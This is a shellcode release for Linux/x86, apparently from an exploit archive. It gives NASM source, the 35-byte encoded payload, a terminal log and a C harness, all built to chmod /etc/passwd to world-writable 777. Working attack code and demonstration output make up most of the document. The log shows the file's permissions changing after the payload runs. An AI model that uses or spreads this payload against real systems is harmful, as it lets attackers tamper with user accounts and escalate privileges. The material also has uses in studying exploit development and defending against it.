/**

Title : chmod 777 /etc/passwd shellcode (Linux/x86) - 35 bytes
Author : Askar
Twitter : @mohammadaskar2
Arch : x86
Tested on : Ubuntu 16.04
Size : 35 bytes

#########################################
ChmodPasswd.nasm

global _start
; Jump call pop technique
section .text:

	_start:
	jmp short caller
	shellcode:
		xor eax, eax
		mov al, 15
		pop ebx
		mov cx,777o
		int 0x80
		xor eax,eax
		mov al,1
		int 0x80

	caller:
	call shellcode
	file db "/etc/passwd"
#########################################
Execution :

root@ubuntu:/home/askar/Desktop/shellcodes# nasm ChmodPasswd.asm -o ChmodPasswd.o -f elf32
root@ubuntu:/home/askar/Desktop/shellcodes# ld -z execstack ChmodPasswd.o -o ChmodPasswdFinal
root@ubuntu:/home/askar/Desktop/shellcodes# for i in $(objdump -D ChmodPasswdFinal | grep '^ ' | cut -f2); do echo -n "\x$i";done && echo ""
\xeb\x11\x31\xc0\xb0\x0f\x5b\x66\xb9\xff\x01\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xea\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64
root@ubuntu:/home/askar/Desktop/shellcodes# gcc FinalShellcode.c -o chpasswd -fno-stack-protector -z execstack
root@ubuntu:/home/askar/Desktop/shellcodes# ls -la /etc/passwd
-rw-r--r-- 1 root root 2296 Mar 29 01:08 /etc/passwd
root@ubuntu:/home/askar/Desktop/shellcodes# ./chpasswd
Length: 35

root@ubuntu:/home/askar/Desktop/shellcodes# ls -la /etc/passwd
-rwxrwxrwx 1 root root 2296 Mar 29 01:08 /etc/passwd
root@ubuntu:/home/askar/Desktop/shellcodes#


**/




#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\xeb\x11\x31\xc0\xb0\x0f\x5b\x66\xb9\xff\x01\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xea\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
     (*(void(*)()) shellcode)();
}
